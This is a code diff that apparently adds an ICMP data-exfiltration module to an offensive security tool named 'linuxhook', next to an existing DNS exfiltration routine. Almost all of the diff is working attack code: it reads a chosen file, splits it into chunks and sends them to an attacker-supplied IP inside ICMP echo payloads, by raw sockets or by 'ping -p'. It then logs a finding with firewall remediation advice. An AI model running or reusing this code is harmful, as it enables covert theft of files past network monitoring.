@@ -171,3 +171,94 @@ echo "[+] DNS exfiltration complete — $TOTAL chunks sent to ${domain}"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function icmpExfil(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== ICMP Exfiltration ==="]
+
+  const dataFile = argVal(args, "--data-file")
+  const target = argVal(args, "--target")
+
+  if (!dataFile || !target) {
+    output.push("Usage: linuxhook icmp_exfil --data-file /path/to/file --target <attacker-ip>")
+    output.push("Data is hidden in ICMP echo request payloads")
+    return { output: output.join("\n"), findings }
+  }
+
+  const script = `
+if [ ! -r "${dataFile}" ]; then
+  echo "[-] Cannot read ${dataFile}"
+  exit 1
+fi
+
+FILESIZE=$(wc -c < "${dataFile}" 2>/dev/null)
+echo "[*] File: ${dataFile} ($FILESIZE bytes)"
+echo "[*] Target: ${target}"
+
+if command -v python3 >/dev/null 2>&1; then
+  echo "[*] Using python3 raw socket ICMP exfil"
+  python3 -c "
+import socket, struct
+
+def checksum(data):
+    s = 0
+    for i in range(0, len(data)-1, 2):
+        s += (data[i] << 8) + data[i+1]
+    if len(data) % 2:
+        s += data[-1] << 8
+    s = (s >> 16) + (s & 0xffff)
+    return ~(s + (s >> 16)) & 0xffff
+
+with open('${dataFile}', 'rb') as f:
+    data = f.read()
+
+chunk_size = 48
+chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+print(f'[*] Sending {len(chunks)} ICMP packets to ${target}')
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    for i, chunk in enumerate(chunks):
+        header = struct.pack('!BBHHH', 8, 0, 0, i & 0xffff, 0)
+        cs = checksum(header + chunk)
+        header = struct.pack('!BBHHH', 8, 0, cs, i & 0xffff, 0)
+        sock.sendto(header + chunk, ('${target}', 0))
+    sock.close()
+    print(f'[+] Sent {len(chunks)} ICMP packets')
+except PermissionError:
+    print('[-] Raw socket requires root')
+except Exception as e:
+    print(f'[-] Error: {e}')
+" 2>/dev/null
+else
+  echo "[*] Using ping -p (limited to 16 hex bytes per packet)"
+  CHUNKS=$(xxd -p "${dataFile}" 2>/dev/null | fold -w 32)
+  TOTAL=$(echo "$CHUNKS" | wc -l)
+  COUNT=0
+  echo "$CHUNKS" | while read -r chunk; do
+    COUNT=$((COUNT+1))
+    padded=$(printf '%-32s' "$chunk" | tr ' ' '0')
+    ping -c 1 -p "$padded" -s 32 "${target}" >/dev/null 2>&1
+  done
+  echo "[+] Sent $TOTAL ping packets with embedded data"
+fi
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Sent")) {
+    findings.push({
+      checkId: "LNX-ICMPEX-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "EXFILTRATED",
+      resource: dataFile,
+      title: "Data exfiltrated via ICMP",
+      details: `Data from ${dataFile} sent to ${target} embedded in ICMP echo request payloads`,
+      remediation: "Monitor ICMP traffic for unusual payload sizes. Block unnecessary outbound ICMP at the firewall.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
